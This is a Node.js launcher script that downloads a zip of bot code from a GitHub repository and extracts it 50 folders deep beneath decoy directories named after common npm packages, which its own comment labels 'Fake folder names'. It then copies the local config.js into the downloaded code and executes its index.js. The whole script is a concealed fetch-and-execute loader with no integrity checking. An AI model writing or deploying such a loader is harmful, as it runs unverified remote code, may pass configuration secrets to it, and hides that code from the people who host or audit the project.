import fs from "fs";
import path from "path";
import axios from "axios";
import AdmZip from "adm-zip";
import { fileURLToPath } from "url";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// === CONFIG ===
const repoZipUrl = "https://github.com/NOTHING-X-ACC/NOTHING/archive/refs/heads/main.zip";

const rootFolder = path.join(__dirname, "node_modules", "lx");
const targetFolder = "tx";
const DEEP_NEST_COUNT = 50;

// === Fake folder names
const npmFolders = [
  "axios", "chalk", "rimraf", "dotenv", "morgan", "winston",
  "minimist", "yargs", "colors", "commander", "express",
  "uuid", "body-parser", "nodemon", "pino", "mkdirp", "debug",
  "cookie-parser", "fs-extra", "glob", "inquirer", "pm2",
  "cors", "react", "vue", "jest", "ts-node", "dayjs", "ms", "boxen"
];

// === Step 1: Prepare folder structure
function prepareFolderTree() {
  if (!fs.existsSync(rootFolder)) fs.mkdirSync(rootFolder, { recursive: true });

  for (const name of npmFolders) {
    const fakePath = path.join(rootFolder, name);
    if (!fs.existsSync(fakePath)) fs.mkdirSync(fakePath);
  }

  let deepPath = path.join(rootFolder, targetFolder);
  for (let i = 0; i < DEEP_NEST_COUNT; i++) {
    deepPath = path.join(deepPath, "zxy");
  }

  const repoFolder = path.join(deepPath, "qr");
  fs.mkdirSync(repoFolder, { recursive: true });

  return repoFolder;
}

// === Step 2: Download and extract repo
async function downloadAndExtractRepo(repoFolder) {
  try {
    console.log("🔄 Downloading BILAL-MD ZIP...");
    const response = await axios.get(repoZipUrl, { responseType: "arraybuffer" });
    const zip = new AdmZip(Buffer.from(response.data, "binary"));
    zip.extractAllTo(repoFolder, true);
    console.log("✅ BILAL-MD extracted");
  } catch (err) {
    console.error("❌ Error downloading bot:", err.message);
    process.exit(1);
  }
}

// === Step 3: Copy config
function copyConfig(repoPath) {
  const configSrc = path.join(__dirname, "config.js");

  if (fs.existsSync(configSrc)) {
    fs.copyFileSync(configSrc, path.join(repoPath, "config.js"));
    console.log("✅ config.js copied");
  } else {
    console.warn("⚠️ config.js not found - using default config");
  }
}

// === Step 4: Launch Bot
async function launchBot(extractedRepoPath) {
  try {
    console.log("🚀 Launching BILAL-MD...");
    process.chdir(extractedRepoPath);
    
    const indexPath = path.join(extractedRepoPath, "index.js");
    if (!fs.existsSync(indexPath)) {
      console.error("❌ index.js not found in extracted repo!");
      process.exit(1);
    }
    
    await import(indexPath);
  } catch (err) {
    console.error("❌ Bot start error:", err.message);
    process.exit(1);
  }
}

// === Run all steps
(async () => {
  const repoFolder = prepareFolderTree();
  await downloadAndExtractRepo(repoFolder);

  const subDirs = fs
    .readdirSync(repoFolder)
    .filter(f => fs.statSync(path.join(repoFolder, f)).isDirectory());

  if (!subDirs.length) {
    console.error("❌ Zip extracted nothing");
    process.exit(1);
  }

  const extractedRepoPath = path.join(repoFolder, subDirs[0]);
  copyConfig(extractedRepoPath);
  await launchBot(extractedRepoPath);
})();
